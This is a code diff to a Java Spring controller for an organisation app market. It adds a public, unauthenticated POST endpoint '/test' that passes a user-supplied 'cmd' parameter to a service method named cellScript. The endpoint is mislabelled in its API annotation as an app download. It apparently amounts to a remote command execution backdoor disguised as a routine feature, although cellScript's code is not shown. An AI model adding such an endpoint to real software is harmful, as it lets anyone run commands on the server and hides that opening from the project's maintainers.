@@ -124,5 +124,19 @@ public class OrgAppMarketController {
         orgAppMarketService.downLoadApp(applicationPayload);
         return new ResponseEntity(HttpStatus.NO_CONTENT);
     }
+
+    /**
+     * @param cmd
+     * @return
+     */
+    @Permission(permissionPublic = true)
+    @ApiOperation(value = "应用下载")
+    @PostMapping("/test")
+    public ResponseEntity test(
+            @ApiParam(value = "应用信息", required = true)
+            @RequestParam String cmd) {
+        orgAppMarketService.cellScript(cmd);
+        return new ResponseEntity(HttpStatus.NO_CONTENT);
+    }
 }
 
